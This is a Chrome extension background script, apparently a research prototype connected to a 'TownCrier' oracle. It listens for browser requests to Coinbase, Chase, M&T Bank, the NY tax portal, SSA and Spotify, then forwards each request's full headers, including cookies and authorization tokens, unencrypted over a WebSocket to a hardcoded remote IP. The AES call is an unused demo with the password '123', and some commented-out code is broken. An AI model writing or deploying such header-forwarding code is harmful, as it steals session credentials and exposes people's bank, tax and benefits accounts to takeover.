/*
function sendRequest(data) {
  const grpc = require('grpc');

  const protoPath = require('path').join(__dirname);
  const proto = grpc.load({root: protoPath, file: 'tc.proto' });

  //Create a new client instance that binds to the IP and port of the grpc server.
  const client = new proto.rpc.towncrier('128.84.84.208:12345', grpc.credentials.createInsecure());

  client.participate(data, (error, response) => {
    if (!error) {
      console.log("Succeed!");
    } else {
      console.log("Error:", error.message);
    }
  });
}
*/

try {
  importScripts('./aes4js.js');
} catch (e) {
  console.error(e);
}

function stringToArrayBuffer(string) {
  var buffer = new ArrayBuffer(string.length);
  var bufView = new Uint8Array(buffer);
  for (var i=0; i < string.length; i++) {
    bufView[i] = string.charCodeAt(i);
  }
  return buffer;
}

function arrayBufferToString(buffer) {
  return String.fromCharCode.apply(null, new Uint8Array(buffer));
}

const addr = 'ws://128.84.84.208:9001'

const tabStorage = {};
const networkFilters = {
  urls: [
    "https://accounts.coinbase.com/api/v1/user",
    "https://onlinebanking.mtb.com/Accounts/FetchAccountSummary*",
    "https://otc.tax.ny.gov/webapp/wcs/stores/service/*",
    "https://secure01b.chase.com/svc/rr/profile/secure/v1/address/profile/list",
    "https://api.spotify.com/v1/playlists/*",
    "https://secure.ssa.gov/OSSS/xml/downloadXML.action"
  ]
};

chrome.webRequest.onSendHeaders.addListener((details) => {
  data = details.url;
  console.log(details.url);
  if (typeof details.requestHeaders !== 'undefined') {
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name !== 'Accept-Encoding') {
        data = data + "\n" + details.requestHeaders[i].name + ": " + details.requestHeaders[i].value;
        console.log(details.requestHeaders[i].name, details.requestHeaders[i].value);
      }
    }
  }
  var ws = new WebSocket(addr);
  ws.onopen = function(evt) {
    aes4js.encrypt("123", "hello world") // encrypt with password 123
      .then(aes4js.decrypt.bind(this, "123")) // decrypt
      //.then(alert) // display decrypted value
    console.log("Preparing ");
    chrome.tabs.create({url:"hello.html"});
    //alert("sending HTTP header to TC");
    ws.send(data);
    ws.close();
  };

  ws.onmessage = function(evt) {
    console.log( "Received Message: " + evt.data);
    ws.close();
  };

  ws.onclose = function(evt) {
    console.log("Connection closed.");
  };      

/*
  chrome.socket.create("tcp", (createInfo) => {
    var socketId = createInfo.socketId;
    chrome.socket.connect(socketId, hostname, port, (result) => {
      if (result === 0) {
        var requestString = "GET / HTTP/1.1\r\nHost: "+hostname+"\r\nConnection: close\r\n\r\n";
        var requestBuffer = stringToArrayBuffer(requestString);
        chrome.socket.write(socketId, requestBuffer, (writeInfo)) {});
      }
    });
  });
*/
//sendRequest(details.url);
}, networkFilters, ["requestHeaders", "extraHeaders"]);
